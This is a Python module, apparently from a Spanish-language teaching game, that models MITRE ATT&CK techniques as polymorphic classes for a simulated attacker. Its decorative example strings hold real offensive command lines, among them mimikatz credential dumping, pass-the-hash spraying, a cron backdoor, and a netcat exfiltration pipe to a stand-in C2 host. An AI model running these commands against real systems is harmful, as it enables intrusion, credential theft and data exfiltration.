"""Catálogo de técnicas del atacante (abstraído de MITRE ATT&CK).

Sesión 2 — polimorfismo y enlace dinámico: cada técnica es una CLASE que
hereda de `Tecnica` y sobreescribe `validar()` y/o `efecto()`. El motor llama
`tecnica.efecto(e, nodo)` sin saber cuál es: el runtime despacha al método
correcto según el tipo real del objeto (la "V-Table"). Para agregar una técnica
nueva se escribe una subclase y se registra; el motor NO se toca (abierto a
extensión, cerrado a modificación).

El registro TECNICA_POR_ID es un diccionario CERRADO: el id que manda el
cliente solo sirve como clave, nunca para importar código (sin reflexión).

Son PARÁMETROS de simulación, no comandos reales: `comandoEjemplo` es texto
decorativo para la terminal del juego.
"""

from typing import Optional

ORDEN_FASE = ['recon', 'acceso_inicial', 'escalada', 'movimiento_lateral', 'exfiltracion']


def fase_index(f: Optional[str]) -> int:
    if f is None:
        return -1
    return ORDEN_FASE.index(f) if f in ORDEN_FASE else -1


def fase_max(actual: Optional[str], nueva: str) -> str:
    """La fase nunca retrocede por un ataque: se queda con la más avanzada."""
    return ORDEN_FASE[max(fase_index(actual), fase_index(nueva))]


class Tecnica:
    # ---- metadatos (se envían al cliente) ----
    id = ''
    nombre = ''
    tacticaMitre = ''
    faseRequiere: Optional[str] = None
    faseProduce = 'recon'
    ruido = 'medio'          # bajo | medio | alto -> cuánto mueve al detector
    facilidadBase = 0.5      # 0..1
    costo = 2                # energía que consume
    descripcion = ''
    comandoEjemplo = ''
    puntos = 10              # puntos que gana el atacante si tiene éxito

    def meta(self) -> dict:
        return {k: getattr(self, k) for k in (
            'id', 'nombre', 'tacticaMitre', 'faseRequiere', 'faseProduce', 'ruido',
            'facilidadBase', 'costo', 'descripcion', 'comandoEjemplo', 'puntos')}

    # ---- comportamiento polimórfico ----
    def validar(self, e, n) -> Optional[str]:
        """Regla por defecto: nodo alcanzable y kill chain en orden. None = válida."""
        if not e.alcanzable(n['id']):
            return 'Nodo no alcanzable (necesitas un foothold adyacente)'
        fx = fase_index(n['fase'])
        if fx < fase_index(self.faseRequiere):
            return f'Requiere fase previa: {self.faseRequiere}'
        if fx >= fase_index(self.faseProduce):
            return 'Fase ya alcanzada en este nodo'
        return None

    def efecto(self, e, n) -> str:
        """Aplica el éxito y devuelve la salida para la terminal del atacante."""
        n['fase'] = fase_max(n['fase'], self.faseProduce)
        return f"[+] SUCCESS: {self.nombre} exitosa sobre {n['nombre']}."


class _SinRequisitoDeFase(Tecnica):
    """Basta con que el nodo sea alcanzable (se puede repetir)."""

    def validar(self, e, n):
        if not e.alcanzable(n['id']):
            return 'Nodo no alcanzable (necesitas un foothold adyacente)'
        return None


class Portscan(Tecnica):
    id, nombre, tacticaMitre = 'portscan', 'Barrido de puertos', 'TA0007 Discovery'
    faseProduce, ruido, facilidadBase, costo, puntos = 'recon', 'alto', 0.9, 1, 5
    descripcion = 'Descubre puertos, servicios y hosts vecinos. Muy ruidoso, fácil de detectar.'
    comandoEjemplo = 'nmap -sS -T4 -p- {target}'

    def efecto(self, e, n):
        super().efecto(e, n)
        return f"[+] RECON: {n['nombre']} escaneado. Servicios: {', '.join(n['servicios'])}. Vecinos revelados en el mapa."


class Enumeracion(Tecnica):
    id, nombre, tacticaMitre = 'enum', 'Enumeración de servicios', 'TA0007 Discovery'
    faseProduce, ruido, facilidadBase, costo, puntos = 'recon', 'medio', 0.8, 1, 5
    descripcion = 'Identifica versiones, banners y configuraciones vulnerables (más sigiloso que el barrido).'
    comandoEjemplo = 'nmap -sV -sC --version-all {target}'

    def efecto(self, e, n):
        super().efecto(e, n)
        cves = ', '.join(v.get('cve') or v['id'] for v in n['vulnerabilidades']) or 'ninguna'
        return f"[+] ENUM: versiones identificadas en {n['nombre']}. Vulnerabilidades: {cves}."


class ScanDocs(_SinRequisitoDeFase):
    id, nombre, tacticaMitre = 'scan_docs', 'Búsqueda de .env y documentos', 'TA0009 Collection'
    faseProduce, ruido, facilidadBase, costo, puntos = 'recon', 'bajo', 0.85, 2, 5
    descripcion = 'Busca variables .env, tokens, backups y documentos confidenciales expuestos.'
    comandoEjemplo = 'gobuster dir -u http://{target} -w sec_files.txt -x env,bak,docx,pdf,sql'

    def efecto(self, e, n):
        n['fase'] = n['fase'] or 'recon'
        sensibles = n.get('archivosSensibles') or []
        nuevos = 0
        for archivo in sensibles:
            tipo, secreto = 'doc', 'Documento clasificado interno de la organización.'
            if 'env' in archivo:
                tipo, secreto = 'env', f"DB_USER=admin_{n['id']} | DB_PASS=Secret@2026! | JWT_SECRET=sk_live_948f2a1b_{n['id']}"
            elif 'sql' in archivo or 'dump' in archivo or 'tar.gz' in archivo:
                tipo, secreto = 'db', f"DUMP_SQL: {archivo} ({n['valor'] * 2.8:.1f} MB con registros confidenciales)"
            elif any(k in archivo for k in ('pass', 'rsa', 'vault', 'key')):
                tipo, secreto = 'cred', f'CREDENTIALS: Clave privada / hash extraído de {archivo}'
            nuevos += e.agregar_loot(n, archivo, tipo, secreto)
        lista = '\n'.join(f'    * [ARCH_EXPUESTO] {s}' for s in sensibles)
        return f"[+] VULN DISCOVERY: {nuevos} archivos nuevos en {n['nombre']}:\n{lista}"


class Bruteforce(Tecnica):
    id, nombre, tacticaMitre = 'bruteforce', 'Fuerza de credenciales', 'TA0006 Credential Access'
    faseRequiere, faseProduce, ruido, facilidadBase, costo, puntos = 'recon', 'acceso_inicial', 'medio', 0.55, 2, 20
    descripcion = 'Ataque de diccionario contra servicios con credenciales débiles.'
    comandoEjemplo = 'hydra -L users.txt -P rockyou.txt {target} ssh'


class Exploit(Tecnica):
    id, nombre, tacticaMitre = 'exploit', 'Explotación de servicio (RCE)', 'TA0001 Initial Access'
    faseRequiere, faseProduce, ruido, facilidadBase, costo, puntos = 'recon', 'acceso_inicial', 'bajo', 0.45, 3, 25
    descripcion = 'Abusa un CVE crítico (RCE / inyección). Sigiloso pero menos probable.'
    comandoEjemplo = 'python3 exploit_cve.py --rhost {target} --payload reverse_tcp'

    def efecto(self, e, n):
        super().efecto(e, n)
        return f"[+] RCE SHELL OPEN: shell remota establecida en {n['nombre']}."


class SqliDump(Tecnica):
    id, nombre, tacticaMitre = 'sqli_dump', 'Inyección SQL & volcado de tablas', 'TA0001 Initial Access / TA0009 Collection'
    faseRequiere, faseProduce, ruido, facilidadBase, costo, puntos = 'recon', 'acceso_inicial', 'medio', 0.6, 3, 25
    descripcion = 'Explota inyección SQL para sustraer esquemas, contraseñas y tablas.'
    comandoEjemplo = 'sqlmap -u http://{target}/api/v1 --batch --dump-all --threads=4'

    def validar(self, e, n):
        if 'sql' not in n['servicios'] and 'http' not in n['servicios']:
            return 'El nodo no expone HTTP ni SQL'
        return _SinRequisitoDeFase.validar(self, e, n)

    def efecto(self, e, n):
        n['fase'] = fase_max(n['fase'], 'acceso_inicial')
        e.agregar_loot(n, f"sqli_dump_{n['id']}.sql", 'db',
                       f"SQL TABLE DUMP: 'usuarios', 'roles', 'transacciones' ({n['valor'] * 1.8:.1f} MB).")
        for archivo in n.get('archivosSensibles') or []:
            if 'sql' in archivo or 'dump' in archivo:
                e.agregar_loot(n, archivo, 'db', f'EXTRACTED SQL TABLE: {archivo} vía inyección de consultas.')
        return (f"[+] SQLMAP - INYECCIÓN SQL EXITOSA en {n['nombre']}:\n"
                f"    [+] Tablas: ['usuarios_admin', 'cuentas_2026', 'sesiones_activas']\n"
                f"    [+] Registros guardados en C2: sqli_dump_{n['id']}.sql")


class Privesc(Tecnica):
    id, nombre, tacticaMitre = 'privesc', 'Escalada de privilegios', 'TA0004 Privilege Escalation'
    faseRequiere, faseProduce, ruido, facilidadBase, costo, puntos = 'acceso_inicial', 'escalada', 'bajo', 0.5, 3, 30
    descripcion = 'Explota debilidades locales para obtener ROOT / SYSTEM.'
    comandoEjemplo = 'winpeas.exe  # o linpeas.sh'

    def efecto(self, e, n):
        super().efecto(e, n)
        return f"[+] ROOT ACCESS GRANTED: control total de {n['nombre']}."


class DumpLsass(Tecnica):
    id, nombre, tacticaMitre = 'dump_lsass', 'Volcado de memoria LSASS', 'TA0006 Credential Access'
    faseRequiere, faseProduce, ruido, facilidadBase, costo, puntos = 'escalada', 'escalada', 'medio', 0.7, 3, 15
    descripcion = 'Extrae hashes NTLM y tickets de la memoria (requiere privilegios).'
    comandoEjemplo = 'mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit'

    def validar(self, e, n):
        if fase_index(n['fase']) < fase_index('escalada'):
            return 'Requiere privilegios elevados (escalada) en el nodo'
        return None

    def efecto(self, e, n):
        e.agregar_loot(n, f"lsass_hashes_{n['id']}.txt", 'cred',
                       'NTLM_HASHES: Administrator:500:aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::')
        for archivo in n.get('archivosSensibles') or []:
            if any(k in archivo for k in ('pass', 'rsa', 'key')):
                e.agregar_loot(n, archivo, 'cred', f'CREDENTIAL VAULT: {archivo} extraído de memoria.')
        return f"[+] MIMIKATZ: hashes NTLM y TGT de dominio capturados en {n['nombre']}."


class PersistBackdoor(Tecnica):
    id, nombre, tacticaMitre = 'persist_backdoor', 'Persistencia (Web Shell / Cron)', 'TA0003 Persistence'
    faseRequiere, faseProduce, ruido, facilidadBase, costo, puntos = 'acceso_inicial', 'escalada', 'bajo', 0.65, 2, 15
    descripcion = 'Planta una tarea programada oculta: resiste un SIGKILL (terminar proceso).'
    comandoEjemplo = 'echo "*/5 * * * * root /bin/c2_beacon" >> /etc/cron.d/sync'

    def validar(self, e, n):
        if fase_index(n['fase']) < fase_index('acceso_inicial'):
            return 'Requiere acceso inicial previo en el nodo'
        if n.get('persistente'):
            return 'Ya hay persistencia instalada'
        return None

    def efecto(self, e, n):
        n['fase'] = fase_max(n['fase'], 'escalada')
        n['persistente'] = True
        return f"[+] PERSISTENCIA INSTALADA en {n['nombre']}: cron + webshell (resiste SIGKILL)."


class PhishingSpray(_SinRequisitoDeFase):
    id, nombre, tacticaMitre = 'phishing_spray', 'Credential Spraying & Pass-the-Hash', 'TA0008 Lateral Movement'
    faseRequiere, faseProduce, ruido, facilidadBase, costo, puntos = 'recon', 'acceso_inicial', 'medio', 0.55, 2, 20
    descripcion = 'Prueba credenciales y hashes robados contra SMB, WinRM y SSH.'
    comandoEjemplo = 'crackmapexec smb {target} -u users.txt -H ntlm_hashes.txt'

    def validar(self, e, n):
        if fase_index(n['fase']) >= fase_index('acceso_inicial'):
            return 'El nodo ya está comprometido'
        return super().validar(e, n)

    def efecto(self, e, n):
        n['fase'] = fase_max(n['fase'], 'acceso_inicial')
        return f"[+] CRACKMAPEXEC: autenticación exitosa en {n['nombre']} (Pwn3d!)."


class Pivot(Tecnica):
    id, nombre, tacticaMitre = 'pivot', 'Pivote lateral', 'TA0008 Lateral Movement'
    faseRequiere, faseProduce, ruido, facilidadBase, costo, puntos = 'escalada', 'acceso_inicial', 'medio', 0.55, 3, 30
    descripcion = 'Salta desde un vecino con privilegios y compromete este nodo directamente.'
    comandoEjemplo = 'chisel client {target}:8000 R:socks && proxychains psexec'

    def validar(self, e, n):
        if fase_index(n['fase']) >= fase_index('acceso_inicial'):
            return 'El nodo ya está comprometido'
        if not e.tiene_salto_lateral(n['id']):
            return 'Necesitas un nodo adyacente con privilegios (escalada)'
        return None

    def efecto(self, e, n):
        super().efecto(e, n)
        return f"[+] PIVOT ESTABLISHED: túnel lateral abierto hacia {n['nombre']}."


class Exfil(Tecnica):
    id, nombre, tacticaMitre = 'exfil', 'Robo y exfiltración de datos', 'TA0010 Exfiltration'
    faseRequiere, faseProduce, ruido, facilidadBase, costo, puntos = 'acceso_inicial', 'exfiltracion', 'alto', 0.65, 4, 0
    descripcion = 'Empaqueta y extrae los datos del nodo hacia el C2. Suma al objetivo de victoria.'
    comandoEjemplo = 'pg_dump {target} | gpg -c | nc -w 3 c2.example 4444'

    def validar(self, e, n):
        if fase_index(n['fase']) < fase_index('acceso_inicial'):
            return 'Debes comprometer el nodo antes de exfiltrar'
        if n['valor'] <= 0:
            return 'Nodo sin datos de valor'
        if n['id'] in e.exfiltrados:
            return 'Datos ya exfiltrados de este nodo'
        return None

    def efecto(self, e, n):
        e.registrar_exfiltracion(n)
        return (f"[+] EXFILTRATION: {n['valor']} MB de {n['nombre']} enviados al C2 "
                f"(total {e.datos_exfiltrados}/{e.meta_exfiltracion} MB).")


# Registro cerrado (orden = orden en el panel del atacante).
TECNICA_POR_ID = {t.id: t for t in (
    Portscan(), Enumeracion(), ScanDocs(), Bruteforce(), Exploit(), SqliDump(),
    Privesc(), DumpLsass(), PersistBackdoor(), PhishingSpray(), Pivot(), Exfil(),
)}
TECNICAS = [t.meta() for t in TECNICA_POR_ID.values()]
